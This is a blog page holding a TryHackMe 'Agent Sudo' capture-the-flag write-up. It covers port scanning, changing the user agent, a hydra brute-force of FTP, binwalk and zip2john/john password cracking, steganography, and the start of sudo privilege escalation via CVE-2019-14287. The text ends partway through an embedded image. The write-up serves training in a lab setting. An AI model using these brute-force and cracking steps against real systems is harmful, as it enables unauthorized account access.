<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.15">
<link rel="alternate" type="application/rss+xml" href="/Cybernotes/blog/rss.xml" title="Cybernotes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Cybernotes/blog/atom.xml" title="Cybernotes Atom Feed">
<link rel="search" type="application/opensearchdescription+xml" title="Cybernotes" href="/Cybernotes/opensearch.xml"><title data-react-helmet="true">THM Agent sudo writeup | Cybernotes</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://shivam1317.github.io/Cybernotes/blog/agent-sudo"><meta data-react-helmet="true" name="docsearch:language" content="en"><meta data-react-helmet="true" name="docsearch:docusaurus_tag" content="default"><meta data-react-helmet="true" name="google-site-verification" content="QR87sedAl37ED2yeGmgSmXKX6r3GfBffBjunkUFl0rI"><meta data-react-helmet="true" property="og:title" content="THM Agent sudo writeup | Cybernotes"><meta data-react-helmet="true" name="description" content="Tryhackme Agent-sudo room writeup"><meta data-react-helmet="true" property="og:description" content="Tryhackme Agent-sudo room writeup"><meta data-react-helmet="true" property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png"><meta data-react-helmet="true" name="twitter:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png"><meta data-react-helmet="true" property="og:type" content="article"><meta data-react-helmet="true" property="article:published_time" content="2022-02-27T00:00:00.000Z"><meta data-react-helmet="true" property="article:author" content="https://github.com/shivam1317"><meta data-react-helmet="true" property="article:tag" content="stegnography,zip2john,user-agent"><link data-react-helmet="true" rel="icon" href="/Cybernotes/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://shivam1317.github.io/Cybernotes/blog/agent-sudo"><link data-react-helmet="true" rel="alternate" href="https://shivam1317.github.io/Cybernotes/blog/agent-sudo" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://shivam1317.github.io/Cybernotes/blog/agent-sudo" hreflang="x-default"><link data-react-helmet="true" rel="preconnect" href="https://ABHJYS7Q6I-dsn.algolia.net" crossorigin="anonymous"><link rel="stylesheet" href="/Cybernotes/assets/css/styles.b0445982.css">
<link rel="preload" href="/Cybernotes/assets/js/runtime~main.3f3644df.js" as="script">
<link rel="preload" href="/Cybernotes/assets/js/main.6f91976f.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Cybernotes/"><div class="navbar__logo"><img src="/Cybernotes/img/book.png" alt="cybernotes" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/Cybernotes/img/book.png" alt="cybernotes" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">Cybernotes</b></a><a class="navbar__item navbar__link" href="/Cybernotes/docs/intro">Notes</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Cybernotes/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/shivam1317/Cybernotes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link header-github-link" aria-label="GitHub repository"></a><div class="toggle_Pssr toggle_TdHA toggleChecked_cnQY toggleDisabled_jDku"><div class="toggleTrack_SSoT" role="button" tabindex="-1"><div class="toggleTrackCheck_XobZ"><span class="toggleIcon_eZtF">ðŸŒœ</span></div><div class="toggleTrackX_YkSC"><span class="toggleIcon_eZtF">ðŸŒž</span></div><div class="toggleTrackThumb_uRm4"></div></div><input type="checkbox" checked="" class="toggleScreenReader_JnkT" aria-label="Switch between dark and light mode"></div><div class="searchBox_qEbK"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper blog-wrapper blog-post-page"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_a9qW thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_uKok margin-bottom--md">All posts</div><ul class="sidebarItemList_Kvuv"><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/vishwactf2022">VishwaCTF 2022 writeups</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/dejavu">THM Dejavu writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/dogcat">THM Dogcat writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/haskhell">THM HaskHell writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/ide">THM IDE writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/jack-of-all-trades">THM Jack-of-all-trades writeup</a></li><li class="sidebarItem_CF0Q"><a aria-current="page" class="sidebarItemLink_miNk sidebarItemLinkActive_RRTD" href="/Cybernotes/blog/agent-sudo">THM Agent sudo writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/anthem">THM Anthem writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/bounty-hacker">THM Bounty Hacker</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/Brooklyn">THM Brooklyn writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/bruteit">THM Brute-it writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/chillhack">THM chillhack writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/sar-1">Vulnhub SAR-1 writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/spider">HTB Spider writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/troll-1">Vulnhub troll-1 writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/chocolateFactory">THM ChocolateFactory</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/develpy">THM Develpy writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/gamingserver">THM Gamingserver writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/openadmin">HTB OpenAdmin writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/year-of-the-rabbit">THM Year-of-the-rabbit writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/road">THM Road writeup</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/welcome">welcome</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/Cybernotes/blog/blue">Tryhackme Blue Writeup</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_rzP5" itemprop="headline">THM Agent sudo writeup</h1><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2022-02-27T00:00:00.000Z" itemprop="datePublished">February 27, 2022</time> Â· <!-- -->3 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><a href="https://github.com/shivam1317" target="_blank" rel="noopener noreferrer" class="avatar__photo-link avatar__photo"><img class="image_o0gy" src="https://avatars.githubusercontent.com/u/70281451?v=4" alt="0xSH1V4M"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://github.com/shivam1317" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">0xSH1V4M</span></a></div><small class="avatar__subtitle" itemprop="description">Author</small></div></div></div></div></header><meta itemprop="image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png"><div id="post-content" class="markdown" itemprop="articleBody"><p>Hello everyone,</p><p>Today we are going to solve agent sudo room from Tryhackme. we will learn about user-agent, zip2john and CVE-2019-14287</p><p><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png"></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="nmap-results">nmap results<a class="hash-link" href="#nmap-results" title="Direct link to heading">â€‹</a></h2><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">PORT STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token number" style="color:rgb(247, 140, 108)">21</span><span class="token plain">/tcp </span><span class="token function" style="color:rgb(130, 170, 255)">open</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">ftp</span><span class="token plain"> vsftpd </span><span class="token number" style="color:rgb(247, 140, 108)">3.0</span><span class="token plain">.3</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token number" style="color:rgb(247, 140, 108)">22</span><span class="token plain">/tcp </span><span class="token function" style="color:rgb(130, 170, 255)">open</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">ssh</span><span class="token plain"> OpenSSH </span><span class="token number" style="color:rgb(247, 140, 108)">7</span><span class="token plain">.6p1 Ubuntu 4ubuntu0.3 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">Ubuntu Linux</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> protocol </span><span class="token number" style="color:rgb(247, 140, 108)">2.0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">|</span><span class="token plain"> ssh-hostkey:</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2048</span><span class="token plain"> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">RSA</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">256</span><span class="token plain"> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ECDSA</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">\</span><span class="token plain">_ </span><span class="token number" style="color:rgb(247, 140, 108)">256</span><span class="token plain"> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ED25519</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token number" style="color:rgb(247, 140, 108)">80</span><span class="token plain">/tcp </span><span class="token function" style="color:rgb(130, 170, 255)">open</span><span class="token plain"> http Apache httpd </span><span class="token number" style="color:rgb(247, 140, 108)">2.4</span><span class="token plain">.29 </span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">((</span><span class="token variable" style="color:rgb(214, 222, 235)">Ubuntu</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">\</span><span class="token plain">_http-server-header: Apache/2.4.29 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">Ubuntu</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token operator" style="color:rgb(127, 219, 202)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">\</span><span class="token plain">_http-title: Annoucement</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Service Info: OSs: Unix, Linux</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> CPE: cpe:/o:linux:linux_kernel</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><hr><h2 class="anchor anchorWithStickyNavbar_mojV" id="dirsearch-results">dirsearch results<a class="hash-link" href="#dirsearch-results" title="Direct link to heading">â€‹</a></h2><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token plain">:34:41</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">200</span><span class="token plain"> - 218B - /index.php</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token plain">:34:52</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">403</span><span class="token plain"> - 277B - /server-status</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><hr><p>--&gt; got this in default page :</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709110809-3534a124127736551962942d57145e35.png" width="1079" height="321"></p><p>--&gt; after reading hint i know that we have to change the user agent to C so i tried it and found another text on thich i got the username of agent C</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709111333-eb35887d472aaafb9f8eae6f4115603b.png" width="1553" height="575"></p><hr><h2 class="anchor anchorWithStickyNavbar_mojV" id="ftp">FTP<a class="hash-link" href="#ftp" title="Direct link to heading">â€‹</a></h2><p>--&gt; Let&#x27;s brute force the password of FTP using hydra</p><div class="codeBlockContainer_I0IT language-c theme-code-block"><div class="codeBlockContent_wNvx c"><pre tabindex="0" class="prism-code language-c codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">hydra </span><span class="token operator" style="color:rgb(127, 219, 202)">-</span><span class="token plain">l chris </span><span class="token operator" style="color:rgb(127, 219, 202)">-</span><span class="token plain">P </span><span class="token operator" style="color:rgb(127, 219, 202)">/</span><span class="token plain">usr</span><span class="token operator" style="color:rgb(127, 219, 202)">/</span><span class="token plain">share</span><span class="token operator" style="color:rgb(127, 219, 202)">/</span><span class="token plain">wordlists</span><span class="token operator" style="color:rgb(127, 219, 202)">/</span><span class="token plain">rockyou</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">txt ftp</span><span class="token operator" style="color:rgb(127, 219, 202)">:</span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">//10.10.34.127</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>--&gt; i got the password for chris</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709111737-a192ef4f0a544dcec04d02c4759aa735.png" width="1297" height="315"></p><p>--&gt; i got this files in ftp</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709111958-6e5b10d939f703593bd638e85f2b5502.png" width="917" height="183"></p><p>--&gt; got this in To_AgentJ file</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">Dear agent J,</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#x27;t be a problem for you.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">From,</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Agent C</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><hr><h2 class="anchor anchorWithStickyNavbar_mojV" id="stegnography">Stegnography<a class="hash-link" href="#stegnography" title="Direct link to heading">â€‹</a></h2><p>--&gt; i used binwalk to extract the data of cutie.png and found some files</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709114136-1794fb8a18cc138aee8718044def3c9f.png" width="1559" height="243"></p><p>--&gt; let&#x27;s extract these files using -e flag</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">binwalk -e cutie.png</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>--&gt; for this we have to locate zip2john which is similar to ssh2john so Let&#x27;s run this and store the output in decrypted file !</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">locate zip2john</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/sbin/zip2john 8702.zip &gt; decrypted</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">john --wordlist=/usr/share/wordlist/rockyou.txt decrypted</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>--&gt; and i got the password !</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709114952-b153dc4dc2f89008e0c012259235e377.png" width="1133" height="255"></p><p>--&gt; i found this txt file after extracting the zip file !</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">Agent C,</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">By,</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Agent R</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>--&gt; after decrypting that word i found the stego password which was Area51</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709115315-542c073b9b55ca0032b97dc4558018af.png" width="1057" height="503"></p><p>--&gt; i got message.txt file with that passphrase so Let&#x27;s read that file !</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709115700-e0fc2f17acff4ef53bc84a5e9bd407cd.png" width="715" height="305"></p><p><img src="/Cybernotes/assets/images/Pastedimage20210709115717-263d7d869a5efb17e9cd37add0a4cb24.png" width="597" height="157"></p><p>--&gt; and i got the ssh password for james in that file !</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">Hi james,</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Glad you find this message. Your login password is hackerrules!</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Your buddy,</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">chris</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><hr><h2 class="anchor anchorWithStickyNavbar_mojV" id="image-stegno">Image stegno<a class="hash-link" href="#image-stegno" title="Direct link to heading">â€‹</a></h2><p>--&gt; i got this image in home directory</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709122756-6c343ebf9690732c03491b3d2667b5b8.png" width="707" height="325"></p><p>--&gt; then i watched hint and found one article on foxnews.com</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709122855-2ce31db4fdd1ef5963d1c1851c91c15f.png" width="1171" height="799"></p><p>--&gt; so we answered all questions so let&#x27;s do privesc now !</p><hr><h2 class="anchor anchorWithStickyNavbar_mojV" id="privesc">Privesc<a class="hash-link" href="#privesc" title="Direct link to heading">â€‹</a></h2><p>--&gt; first of all i done sudo -l and found one interesting thing :</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709123801-00c341b59b40306022471f59dc8b3a2b.png" width="1139" height="197"></p><p>--&gt; this line looks weird so i copied it and pasted it on google and found one exploit for this on exploitdb.com</p><p><img src="/Cybernotes/assets/images/Pastedimage20210709123848-237975c9012c7a811e9dacee5fdf4f1f.png" width="1145" height="595"></p><p>--&gt; also i got CVE number from exploit-db</p><p><img src="data:image/png;base64,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